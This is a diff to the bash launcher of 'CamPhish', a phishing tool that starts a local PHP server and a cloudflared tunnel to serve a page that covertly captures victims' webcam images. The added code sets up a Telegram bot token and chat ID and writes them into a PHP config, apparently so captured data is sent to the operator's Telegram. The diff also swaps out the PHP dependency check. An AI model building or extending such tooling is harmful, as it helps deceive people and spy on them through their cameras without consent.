@@ -2,7 +2,12 @@
 # CamPhish v2.0
 # Powered by TechChip
 
+# Ensure python/php is found for XAMPP users on Windows
+export PATH=$PATH:/mnt/c/xampp/php
+
 # Windows compatibility check
+
+
 if [[ "$(uname -a)" == *"MINGW"* ]] || [[ "$(uname -a)" == *"MSYS"* ]] || [[ "$(uname -a)" == *"CYGWIN"* ]] || [[ "$(uname -a)" == *"Windows"* ]]; then
   # We're on Windows
   windows_mode=true
@@ -47,8 +52,11 @@ printf "\n"
 }
 
 dependencies() {
-command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
+    # php -v > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
+    echo "Checking dependencies..."
 }
+
+
 
 stop() {
 if [[ "$windows_mode" == true ]]; then
@@ -260,7 +268,7 @@ fi
 fi
 
 printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
-php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
+php -S 127.0.0.1:3333 > php_error.log 2>&1 & 
 sleep 2
 printf "\e[1;92m[\e[0m+\e[1;92m] Starting cloudflared tunnel...\n"
 rm -rf .cloudflared.log > /dev/null 2>&1 &
@@ -515,6 +523,61 @@ fi
 fi
 }
 
+
+# Telegram Integration
+telegram_setup() {
+    # Check for saved tokens
+    if [[ ! -f "telegram_tokens.txt" ]]; then
+        touch telegram_tokens.txt
+    fi
+
+    echo ""
+    echo -e "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Configuring Telegram Bot...\e[0m"
+    
+    # Read existing tokens
+    mapfile -t tokens < telegram_tokens.txt
+    
+    if [ ${#tokens[@]} -gt 0 ]; then
+        echo -e "\e[1;93mSelect a saved Bot Token:\e[0m"
+        for i in "${!tokens[@]}"; do
+            # Mask the token for display
+            display_token="${tokens[$i]:0:15}..."
+            echo -e "[$i] $display_token"
+        done
+        echo -e "[n] Add new Bot Token"
+        
+        read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Select option: \e[0m' choice
+    else
+        choice="n"
+    fi
+
+    if [[ "$choice" == "n" ]]; then
+        echo ""
+        read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter Telegram Bot Token: \e[0m' bot_token
+        read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Enter Telegram Chat ID: \e[0m' chat_id
+        
+        # Save to history
+        echo "$bot_token|$chat_id" >> telegram_tokens.txt
+
+        
+    else
+        # Parse selected line
+        selected_line="${tokens[$choice]}"
+        bot_token=$(echo "$selected_line" | cut -d'|' -f1)
+        chat_id=$(echo "$selected_line" | cut -d'|' -f2)
+    fi
+
+    # Write config for PHP
+    echo "<?php
+\$telegram_bot_token = '$bot_token';
+\$telegram_chat_id = '$chat_id';
+?>" > telegram_config.php
+
+    echo -e "\e[1;92m[+] Telegram configured successfully!\e[0m"
+    sleep 1
+}
+
+telegram_setup
 banner
 dependencies
 camphish
